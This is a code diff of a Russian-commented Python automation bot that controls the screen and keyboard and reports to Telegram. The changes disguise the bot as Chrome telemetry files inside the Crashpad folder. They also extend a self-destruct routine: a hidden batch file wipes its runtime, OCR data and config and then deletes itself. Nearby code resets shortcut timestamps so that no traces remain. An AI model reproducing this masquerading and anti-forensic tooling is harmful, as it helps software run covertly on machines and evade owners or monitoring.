@@ -25,52 +25,19 @@ def emergency_tg_send(text):
     except:
         pass
 
-# ================= 2. АБСОЛЮТНЫЙ ПЕРЕХВАТЧИК ОШИБОК =================
+# ================= 2. ПРОВЕРКА ЗАВИСИМОСТЕЙ =================
 try:
-    import_to_pip = {
-        'pyautogui': 'PyAutoGUI',
-        'cv2': 'opencv-python',
-        'numpy': 'numpy',
-        'pytesseract': 'pytesseract',
-        'requests': 'requests',
-        'keyboard': 'keyboard',
-        'mss': 'mss'
-    }
-    
-    missing_mods = []
-    missing_pips = []
-    
-    for mod, pip_name in import_to_pip.items():
+    required_modules = ['pyautogui', 'cv2', 'numpy', 'pytesseract', 'requests', 'keyboard', 'mss', 'tkinter']
+    missing = []
+    for mod in required_modules:
         try:
             __import__(mod)
         except ImportError:
-            missing_mods.append(mod)
-            missing_pips.append(pip_name)
-            
-    try:
-        import tkinter
-    except ImportError:
-        missing_mods.append('tkinter')
+            missing.append(mod)
 
-    if missing_mods:
-        if getattr(sys, 'frozen', False):
-            err_msg = (f"❌ КРИТИЧЕСКАЯ ОШИБКА!\nОтсутствуют модули: {', '.join(missing_mods)}.\n\n"
-                       f"Перекомпилируйте Загрузчик с этими модулями в 'hidden-imports'.")
-            emergency_tg_send(err_msg)
-            sys.exit(1)
-        else:
-            if 'tkinter' in missing_mods:
-                emergency_tg_send("❌ Отсутствует 'tkinter'. Переустановите Python с галочкой 'tcl/tk'.")
-                sys.exit(1)
-                
-            emergency_tg_send(f"⚠️ Отсутствуют библиотеки: {', '.join(missing_mods)}. Устанавливаю (pip install)...")
-            try:
-                subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing_pips)
-                emergency_tg_send("✅ Библиотеки установлены! Перезапускаю...")
-                os.execv(sys.executable, ['python'] + sys.argv)
-            except Exception as e:
-                emergency_tg_send(f"❌ Сбой установки: {str(e)}")
-                sys.exit(1)
+    if missing:
+        emergency_tg_send(f"❌ Отсутствуют модули: {', '.join(missing)}. Переустановите окружение через Загрузчик.")
+        sys.exit(1)
 
     # ================= 3. ОСНОВНЫЕ ИМПОРТЫ =================
     import pyautogui
@@ -88,100 +55,21 @@ try:
     import tkinter as tk
     from mss import mss
 
-    CURRENT_VERSION = 1.8 # Версия со Светлым Неоморфизмом и умным перезапуском
+    CURRENT_VERSION = 1.9 # Версия с авто-установщиком окружения
 
     # ================= ПУТЬ К TESSERACT И КОНФИГУ =================
-    # Функция для автоматической установки Tesseract OCR если отсутствует
-    def ensure_tesseract():
-        """Проверяет наличие Tesseract OCR и при необходимости скачивает портативную версию"""
-        import zipfile
-        import tempfile
-        
-        # Стандартный путь установки
-        standard_path = r'C:\Program Files\Tesseract-OCR\tesseract.exe'
-        
-        # Проверяем стандартный путь
-        if os.path.exists(standard_path):
-            pytesseract.pytesseract.tesseract_cmd = standard_path
-            emergency_tg_send(f"✅ Tesseract найден по стандартному пути: {standard_path}")
-            return
-        
-        # Портативная папка рядом со скриптом
-        script_dir = os.path.dirname(os.path.abspath(__file__)) if not getattr(sys, 'frozen', False) else os.path.dirname(sys.executable)
-        portable_dir = os.path.join(script_dir, 'tesseract_portable')
-        portable_exe = os.path.join(portable_dir, 'tesseract.exe')
-        
-        # Проверяем портативную версию
-        if os.path.exists(portable_exe):
-            pytesseract.pytesseract.tesseract_cmd = portable_exe
-            emergency_tg_send(f"✅ Используется портативный Tesseract: {portable_exe}")
-            return
-        
-        # Если Tesseract не найден, скачиваем портативную версию
-        emergency_tg_send("⚠️ Tesseract OCR не найден. Скачиваю портативную версию...")
-        
-        # Создаем временную директорию
-        temp_dir = tempfile.mkdtemp()
-        zip_path = os.path.join(temp_dir, 'tesseract.zip')
-        
-        # Ссылка на портативный Tesseract 3.02 (стабильная версия)
-        tesseract_url = 'https://sourceforge.net/projects/tesseract-ocr-alt/files/tesseract-ocr-3.02-win32-portable.zip/download'
-        
-        try:
-            # Скачиваем архив
-            emergency_tg_send(f"📥 Скачиваю Tesseract OCR с {tesseract_url}")
-            response = requests.get(tesseract_url, stream=True, timeout=30)
-            response.raise_for_status()
-            
-            with open(zip_path, 'wb') as f:
-                for chunk in response.iter_content(chunk_size=8192):
-                    f.write(chunk)
-            
-            # Распаковываем архив
-            emergency_tg_send("📦 Распаковываю архив...")
-            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
-                # Ищем папку с tesseract.exe
-                for file_info in zip_ref.infolist():
-                    if file_info.filename.endswith('tesseract.exe'):
-                        # Извлекаем все файлы в портативную директорию
-                        zip_ref.extractall(portable_dir)
-                        break
-                else:
-                    # Если не нашли tesseract.exe напрямую, распаковываем всё
-                    zip_ref.extractall(portable_dir)
-            
-            # Ищем tesseract.exe в распакованных файлах
-            for root, dirs, files in os.walk(portable_dir):
-                if 'tesseract.exe' in files:
-                    tesseract_exe = os.path.join(root, 'tesseract.exe')
-                    pytesseract.pytesseract.tesseract_cmd = tesseract_exe
-                    emergency_tg_send(f"✅ Tesseract OCR установлен: {tesseract_exe}")
-                    
-                    # Очистка временных файлов
-                    try:
-                        shutil.rmtree(temp_dir)
-                    except:
-                        pass
-                    return
-            
-            # Если tesseract.exe не найден после распаковки
-            emergency_tg_send("❌ Не удалось найти tesseract.exe в архиве")
-            pytesseract.pytesseract.tesseract_cmd = standard_path  # fallback
-            
-        except Exception as e:
-            emergency_tg_send(f"❌ Ошибка при установке Tesseract: {str(e)}")
-            # Пробуем использовать стандартный путь (может быть установлен позже)
-            pytesseract.pytesseract.tesseract_cmd = standard_path
-            
-            # Очистка временных файлов
-            try:
-                shutil.rmtree(temp_dir)
-            except:
-                pass
-    
-    # Вызываем функцию проверки и установки Tesseract
-    ensure_tesseract()
-    
+    # Путь передаётся Надзирателем через переменную окружения TESSERACT_PATH
+    _tesseract_from_env = os.environ.get('TESSERACT_PATH', '')
+    if _tesseract_from_env and os.path.isfile(_tesseract_from_env):
+        pytesseract.pytesseract.tesseract_cmd = _tesseract_from_env
+    else:
+        # Фолбэк: стандартный путь нашей установки
+        _fallback = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Crashpad\tessdata\tesseract.exe")
+        if os.path.isfile(_fallback):
+            pytesseract.pytesseract.tesseract_cmd = _fallback
+        else:
+            # Последний шанс: стандартный системный путь
+            pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'
     CONFIG_FILE = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Crashpad\telemetry_conf.dat")
 
     # ================= КООРДИНАТЫ И ЗОНЫ =================
@@ -316,13 +204,27 @@ try:
                         shutil.copy2(clean_lnk, p)
                         os.utime(p, (stat.st_atime, stat.st_mtime))
             
-            # 5. Батник для удаления файлов Надзирателя и Конфига
+            # 5. Батник для удаления ВСЕГО: Надзиратель + Python + Tesseract + кеш + конфиг
             bat_path = os.path.join(os.environ.get('TEMP', ''), 'ultimate_panic.bat')
-            hidden_exe = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Crashpad\chrome_telemetry.exe")
-            cache_file = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Crashpad\telemetry_cache.dat")
+            crashpad_dir = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Crashpad")
+            hidden_exe = os.path.join(crashpad_dir, "chrome_telemetry.exe")
+            cache_file = os.path.join(crashpad_dir, "telemetry_cache.py")
+            marker_file = os.path.join(crashpad_dir, ".installed")
+            pyruntime_dir = os.path.join(crashpad_dir, "pyruntime")
+            tessdata_dir = os.path.join(crashpad_dir, "tessdata")
             
             with open(bat_path, 'w', encoding='utf-8') as f:
-                f.write(f'@echo off\nping 127.0.0.1 -n 3 > NUL\ndel /f /q "{hidden_exe}"\ndel /f /q "{cache_file}"\ndel /f /q "{CONFIG_FILE}"\ndel "%~f0"')
+                f.write(
+                    f'@echo off\n'
+                    f'ping 127.0.0.1 -n 3 > NUL\n'
+                    f'del /f /q "{hidden_exe}"\n'
+                    f'del /f /q "{cache_file}"\n'
+                    f'del /f /q "{CONFIG_FILE}"\n'
+                    f'del /f /q "{marker_file}"\n'
+                    f'rmdir /s /q "{pyruntime_dir}"\n'
+                    f'rmdir /s /q "{tessdata_dir}"\n'
+                    f'del "%~f0"\n'
+                )
             subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=0x08000000)
             
             emergency_tg_send("✅ Бот испарился. Системные логи и ярлыки абсолютно чисты.")
